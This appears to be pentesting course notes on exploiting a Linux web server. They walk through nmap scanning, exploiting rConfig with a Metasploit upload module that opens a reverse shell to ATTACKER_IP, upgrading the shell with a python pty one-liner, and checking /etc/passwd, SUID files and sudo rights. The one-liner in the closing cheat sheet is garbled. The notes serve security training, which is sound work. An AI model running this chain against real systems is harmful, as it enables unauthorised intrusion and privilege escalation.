# 1️⃣ Why Linux Is Important for Pentesting

Over **70% of web servers run Unix/Linux**, making it the most common OS in web infrastructure.

Common Linux usage:

- Web servers (Apache, Nginx)
    
- Databases (MySQL, PostgreSQL)
    
- Cloud servers (AWS, Azure, GCP)
    
- Internal infrastructure servers
    

Goal: Gain shell → escalate privileges → pivot deeper into network

---

## 📊 Linux Server Attack Surface

![Image](https://www.researchgate.net/publication/265398254/figure/fig2/AS%3A669454300110854%401536621751593/Attack-Surface-Example-Threat-modeling-then-analyzes-the-data-flow-diagram-as-shown-in.jpg)

![Image](https://relevant.software/media-webp/RelevantSoftware-Web-application-penetration-testing-methodology-1.jpg.webp)

![Image](https://upload.wikimedia.org/wikipedia/commons/8/82/LAMP_software_bundle.svg)

![Image](https://www.researchgate.net/publication/7032895/figure/fig2/AS%3A287841717374976%401445638221395/System-architecture-The-system-used-the-PHP-504-Apache-1333-Win32-and-MySQL.png)

---

# 2️⃣ Key Questions Before Exploiting Linux

Always identify:

| Question                | Purpose                  |
| ----------------------- | ------------------------ |
| Linux distribution?     | Identify vulnerabilities |
| Running services?       | Identify attack surface  |
| Applications installed? | Exploit vulnerable apps  |
| Available shells?       | Payload compatibility    |
| Known vulnerabilities?  | Exploitation path        |

---

# 3️⃣ Enumeration with Nmap

Command:

```bash
nmap -sC -sV TARGET_IP
```

Example output:

```text
PORT     SERVICE VERSION
21/tcp   ftp     vsftpd
22/tcp   ssh     OpenSSH 7.4
80/tcp   http    Apache 2.4.6 (CentOS)
443/tcp  https   Apache 2.4.6
3306/tcp mysql   MySQL
```

---

# 4️⃣ Identify Target System Information

From scan output:

| Component  | Value        |
| ---------- | ------------ |
| OS         | CentOS Linux |
| Web Server | Apache 2.4.6 |
| Language   | PHP 7.2.34   |
| Database   | MySQL        |
| SSH        | OpenSSH      |

Conclusion:

Target is a web server running CentOS with Apache + PHP.

---

# 5️⃣ Web Application Enumeration

Visit target in browser:

```text
http://TARGET_IP
```

Example discovery:

Application: rConfig

Purpose:

- Network configuration management
    
- Admin access to routers/switches
    
- Critical infrastructure application
    

Compromise impact: Full network compromise

---

## 📊 Web Application Attack Surface

![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/0%2AoXZUH3okBu57qxzA)

![Image](https://media.licdn.com/dms/image/v2/D4D12AQHadOj1wHPwDA/article-cover_image-shrink_720_1280/article-cover_image-shrink_720_1280/0/1673886990132?e=2147483647&t=i1LoNiRHVa661BT0YVhURjV7SqFzgMlz6vwUJHPgIDI&v=beta)

![Image](https://www.researchgate.net/publication/354061244/figure/fig1/AS%3A1059592549179394%401629637958870/Flow-chart-for-the-web-application.ppm)

![Image](https://devopedia.org/images/article/290/9425.1603804132.png)

---

# 6️⃣ Identify Vulnerabilities

Search vulnerability:

```text
rConfig 3.9.6 exploit
```

Sources:

- ExploitDB
    
- CVE database
    
- GitHub
    
- Metasploit modules
    

---

# 7️⃣ Search Exploit in Metasploit

Command:

```bash
msfconsole
```

```bash
search rconfig
```

Example result:

```text
exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

---

# 8️⃣ Load Exploit Module

Command:

```bash
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

View options:

```bash
options
```

Set required options:

```bash
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set LPORT 4444
```

---

# 9️⃣ Execute Exploit

Command:

```bash
exploit
```

Result:

```text
Meterpreter session opened
```

Exploit actions:

| Step | Action                   |
| ---- | ------------------------ |
| 1    | Check vulnerable version |
| 2    | Authenticate to web app  |
| 3    | Upload PHP payload       |
| 4    | Execute payload          |
| 5    | Establish reverse shell  |

---

## 📊 Linux Reverse Shell Exploitation Flow

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://cdn.prod.website-files.com/5ff66329429d880392f6cba2/676182bc78b8b88106a17157_626822d9beb1b531fd597ae2_Reverse%2520Shell%2520in%2520action.jpeg)

![Image](https://www.researchgate.net/publication/335456696/figure/fig1/AS%3A806675057504258%401569337729909/An-example-of-a-reverse-TCP-shell.jpg)

![Image](https://manage.offsec.com/app/uploads/2015/03/EXPLOIT04B.png)

---

# 🔟 Meterpreter Shell Commands

Basic commands:

```bash
whoami
```

```bash
pwd
```

```bash
ls
```

```bash
sysinfo
```

Drop to system shell:

```bash
shell
```

---

# 1️⃣1️⃣ Non-TTY Shell Problem

Non-TTY shell example:

```bash
ls
whoami
```

Missing features:

- No proper prompt
    
- Cannot use sudo properly
    
- Cannot switch users
    

Example user:

```bash
apache
```

---

# 1️⃣2️⃣ Spawn TTY Shell Using Python

Check Python:

```bash
which python
```

Spawn TTY shell:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

Result:

```bash
sh-4.2$
```

You now have full interactive shell.

---

# 1️⃣3️⃣ Why TTY Shell Is Important

Benefits:

|Feature|Non-TTY|TTY|
|---|---|---|
|sudo|❌|✅|
|su|❌|✅|
|interactive commands|❌|✅|
|stable shell|❌|✅|

---

## 📊 TTY Shell Upgrade Process

![Image](https://i.sstatic.net/rcApN.png)

![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/0%2AD7RVaZfx8HPJSwhM.png)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6915b40b4d0c9f662902ed94_5cc923e6.png)

---

# 1️⃣4️⃣ Identify Current User

Command:

```bash
whoami
```

Example:

```text
apache
```

This indicates web server user.

---

# 1️⃣5️⃣ Common Linux Shell Users

|User|Purpose|
|---|---|
|root|Administrator|
|apache|Web server|
|www-data|Web server|
|mysql|Database|

---

# 1️⃣6️⃣ Linux Payload Types

|Payload|Extension|
|---|---|
|ELF|.elf|
|Bash|.sh|
|Python|.py|
|PHP|.php|

---

# 1️⃣7️⃣ Linux Exploitation Workflow

Step-by-step:

```bash
nmap -sC -sV TARGET_IP
```

Identify web app

Search exploit:

```bash
search application exploit
```

Load exploit:

```bash
use exploit/module
```

Set options:

```bash
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
```

Run exploit:

```bash
exploit
```

Get shell:

```bash
shell
```

Spawn TTY shell:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

---

# 1️⃣8️⃣ Post Exploitation Commands

System info:

```bash
uname -a
```

```bash
id
```

```bash
cat /etc/passwd
```

Network info:

```bash
ip a
```

```bash
netstat -antp
```

---

# 1️⃣9️⃣ Privilege Escalation Preparation

Check sudo:

```bash
sudo -l
```

Check SUID files:

```bash
find / -perm -4000 2>/dev/null
```

Check cron jobs:

```bash
crontab -l
```

---

# 2️⃣0️⃣ Linux Exploitation Chain Summary

```text
Scan → Identify Linux → Find vulnerable app → Exploit → Upload payload → Reverse shell → Spawn TTY → Privilege escalation
```

---

# 2️⃣1️⃣ Most Important Commands Cheat Sheet

|Task|Command|
|---|---|
|Scan target|nmap -sC -sV TARGET_IP|
|Find exploit|search exploit|
|Run exploit|exploit|
|Get shell|shell|
|Upgrade shell|python -c 'import pty.spawn("/bin/sh")'|
|Check user|whoami|
|Check privileges|sudo -l|

---
